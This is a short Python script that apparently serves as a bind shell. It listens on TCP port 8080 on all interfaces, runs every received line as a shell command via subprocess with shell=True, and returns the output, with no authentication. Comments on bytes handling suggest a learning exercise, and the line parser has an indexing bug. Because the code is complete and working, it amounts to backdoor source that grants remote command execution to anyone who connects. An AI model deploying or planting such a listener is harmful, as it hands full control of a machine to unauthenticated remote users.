#!/usr/bin/env python3
import subprocess as sp
import socket
import threading as tr

PORT = 8080
HOSTNAME = ""

MAXINPUTSIZE = 1024

def send_msg(s, msg):
    acc = 0
    sent = 0
    while sent := s.send(msg[acc:]):
        acc += sent

def recv_line(s):
    line = b""
    acc = 0

    while line == b"":
        recvd = s.recv(MAXINPUTSIZE)
        for i in range(len(recvd)):
            # recvd is a bytes object
            # indexing a bytes object returns an int
            # so recvd[idx] == b'\n' is always False since
            # int != bytes in python3 (ascii '\n' == 0x0a)
            # for encoding independency: int.from_bytes()
            if recvd[acc+i] == int.from_bytes(b'\n', "little"):
                line = recvd[:acc+i]
        acc += len(recvd)

    return line

class Obj():
    def __init__(self, returncode, stdout):
        self.returncode = returncode
        self.stdout = stdout
#p = {
#        returncode : int
#        stdout : bytes
#        args : str
#    }
# python3 "stderr=sp.STDOUT" == bash "2>&1"
# sp.PIPE (docs): "Special value that can be used as the stdin, stdout
# or stderr argument to Popen and indicates that a pipe to the
# standard stream should be opened."
def shell_loop(s):
    print("Start of Thread %d with socket %s" % (tr.get_native_id(), str(s)))
    try:
        while cmd := recv_line(s):
            p = sp.run(cmd, shell=True, stdout=sp.PIPE, stderr=sp.STDOUT)
            #p = Obj(0, b"aaaa")
            msg = bytearray()
            if p.returncode != 0:
                msg += bytes("ERROR. RETCODE %d" % p.returncode, "utf8")
            else:
                msg += bytes("OK. RETCODE: %d" % p.returncode, "utf8")
            msg += b"\n\n" + p.stdout
            send_msg(s, msg)

            if (cmd == b"exit"):
                break
    except EOFError:
        pass
    print("End of Thread %d, closing socket %s" % (tr.get_native_id(), str(s)))
    s.close()

if __name__ == "__main__":
    sv_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sv_s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR | socket.SO_REUSEPORT, 1)
    sv_s.bind((HOSTNAME, PORT))
    sv_s.listen(5)
    while True:
        s, _ = sv_s.accept()
        new_t = tr.Thread(target=shell_loop,args=(s,))
        new_t.start()
        print("connection being served")
